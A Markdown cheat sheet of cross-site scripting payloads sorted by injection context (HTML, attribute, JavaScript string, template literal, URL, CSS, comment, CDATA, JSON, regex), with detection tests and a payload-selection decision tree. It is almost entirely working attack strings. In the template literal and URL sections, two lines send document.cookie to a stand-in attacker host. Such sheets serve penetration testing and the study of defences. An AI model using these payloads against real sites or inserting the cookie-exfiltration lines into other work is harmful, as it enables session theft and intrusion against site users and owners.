# Context-Specific XSS Payloads

## Critical Rule: Context Determines Payload

Same injection point + different context = completely different payloads.

---

## HTML Context

**Where:** Input between HTML tags

```html
<p>USER_INPUT</p>
<div>USER_INPUT</div>
<span>USER_INPUT</span>
```

**Payloads:**

```html
<img src=1 onerror=alert(1)>
<svg onload=alert(1)>
<script>alert(1)</script>
<iframe onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
<video onloadstart=alert(1) src=x>
<audio onloadstart=alert(1) src=x>
```

**Why it works:**
- Browser interprets angle brackets as HTML tags
- Creates new element with event handler
- Event triggers JavaScript execution

**Detection test:**
```
Inject: xss12345
Look for: <p>xss12345</p> (unescaped)
If found: Likely HTML context XSS
```

---

## HTML Attribute Context

**Where:** Input inside HTML attribute value

```html
<input value="USER_INPUT">
<img src="USER_INPUT">
<div id="USER_INPUT">
<a href="USER_INPUT">
```

**Payloads:**

```html
" onfocus=alert(1) autofocus x="
" onclick=alert(1) x="
" onerror=alert(1) x="
" onmouseover=alert(1) x="
" style=background:url('javascript:alert(1)') x="
' onfocus=alert(1) autofocus x='
" autofocus onfocus=alert(1) x="
" onload=alert(1) x="
```

**Why it works:**
- Double/single quote closes the attribute
- Space and new event handler added
- Remaining quote commented/closed by x="

**Detection test:**
```
Inject: xss" test
Look for: value="xss" test" (quote reflected)
If found: Likely attribute context, try quote-breaking payload
```

---

## JavaScript String Context

**Where:** Input inside JavaScript string

```html
<script>
  var name = 'USER_INPUT';
  var search = "USER_INPUT";
  alert('Result: USER_INPUT');
</script>
```

**Payloads:**

```javascript
'; alert(1); //
"; alert(1); //
' + alert(1) + '
"-alert(1)-"
\'; alert(1); //
\"; alert(1); //
eval(String.fromCharCode(97,108,101,114,116,40,49,41))
```

**Why it works:**
- Closes string with quote
- Adds JavaScript statement
- Comments out rest of line with //

**Detection test:**
```
Inject: xss'; test
Look for: var name = 'xss'; test' (quote reflects)
If found: Likely JS string context
```

---

## JavaScript Template Literal

**Where:** Input inside backticks (modern JavaScript)

```html
<script>
  const message = `Hello ${USER_INPUT}`;
  const result = `Search: USER_INPUT`;
</script>
```

**Payloads:**

```javascript
${alert(1)}
${eval('alert(1)')}
${fetch('attacker.com/steal?c='+document.cookie)}
${''.constructor.prototype.constructor('alert(1)')()}
```

**Why it works:**
- Template literals evaluate ${} expressions
- Arbitrary JavaScript can run inside ${}
- Most powerful if unsanitized

**Detection test:**
```
Inject: xss${1+1}
Look for: xss2 (expression evaluated!)
If found: Template literal - use ${} payloads
```

---

## URL/href Context

**Where:** Input in href, src, or other URL attributes

```html
<a href="USER_INPUT">click</a>
<img src="USER_INPUT">
<iframe src="USER_INPUT">
```

**Payloads:**

```
javascript:alert(1)
javascript:void(fetch('attacker.com/steal?c='+document.cookie))
data:text/html,<img src=1 onerror=alert(1)>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
vbscript:msgbox(1)
```

**Why it works:**
- Browser can execute javascript: protocol
- data: URLs can contain arbitrary content
- Alternative to http:// or https://

**Detection test:**
```
Inject: javascript:1
Look for: href="javascript:1"
If found: URL context, try javascript: payload
```

---

## CSS Context

**Where:** Input in style attribute or <style> tags

```html
<style>
  body { background: USER_INPUT; }
</style>
<div style="USER_INPUT">
```

**Payloads:**

```css
background: url(javascript:alert(1));
background-image: url('javascript:alert(1)');
} body { background: url('javascript:alert(1)') } /* 
expression(alert(1))
@import url('javascript:alert(1)');
```

**Why it works:**
- CSS can include javascript: URLs
- CSS expressions can execute in older browsers
- Requires CSS parsing

**Detection test:**
```
Inject: xss; alert(1);
Look for: style="xss; alert(1);"
If found: CSS context
```

---

## Event Handler Injection

**Where:** User controls entire event handler

```html
USER_INPUT="value"
Click me: <button USER_INPUT>
```

**Payloads:**

```html
onclick=alert(1)
onfocus=alert(1) autofocus
onmouseover=alert(1)
onerror=alert(1)
onload=alert(1)
```

**Why it works:**
- Creates new attribute with event handler
- Event triggers on user interaction or automatically

---

## Comment Context

**Where:** Input inside HTML comment (special case)

```html
<!-- USER_INPUT -->
```

**Payloads:**

```html
--><img src=1 onerror=alert(1)><!--
--></script><img src=1 onerror=alert(1)><!--
--!><img src=1 onerror=alert(1)><!--
```

**Why it works:**
- Breaks out of comment
- Injects new HTML
- Closes comment to avoid syntax error

---

## CDATA Context (XML/SVG)

**Where:** Input in CDATA section

```xml
<![CDATA[USER_INPUT]]>
```

**Payloads:**

```xml
]]><img src=1 onerror=alert(1)><![CDATA[
]]><script>alert(1)</script><![CDATA[
```

---

## JSON Context

**Where:** Input as JSON value

```javascript
var data = {"user":"USER_INPUT"};
```

**Payloads:**

```javascript
"};alert(1);var x={"
"}
alert(1)
{".constructor.constructor("alert(1)")
```

---

## Regular Expression Context

**Where:** Input in regex pattern

```javascript
var pattern = new RegExp('USER_INPUT');
```

**Payloads:**

```javascript
'); alert(1); //
```

---

## Payload Selection Decision Tree

```
Found reflection
  │
  ├─ HTML tags? (< > visible)
  │  └─ HTML Context
  │     Use: <img src=1 onerror=alert(1)>
  │
  ├─ Inside quotes? ("xyz" or 'xyz')
  │  └─ Check JavaScript or Attribute?
  │     ├─ Attribute (href, value, src)
  │     │  Use: " onfocus=alert(1) x="
  │     └─ JavaScript string
  │        Use: '; alert(1); //
  │
  ├─ Inside ${...}?
  │  └─ Template Literal
  │     Use: ${alert(1)}
  │
  ├─ In URL (href, src)?
  │  └─ URL Context
  │     Use: javascript:alert(1)
  │
  ├─ In <style> or style=" "?
  │  └─ CSS Context
  │     Use: url(javascript:alert(1))
  │
  └─ Inside HTML comment <!-- -->?
     └─ Comment Context
        Use: --><img src=1 onerror=alert(1)><!--
```

---

## Generic Payload (Works Often)

If context unclear, try:

```
"><img src=1 onerror=alert(1)>
```

This works if:
- Escapes from attribute
- Creates new img tag
- Executes onerror handler

---

## Rule of Thumb

**Different context = test different payload. Don't just retry the same payload.**

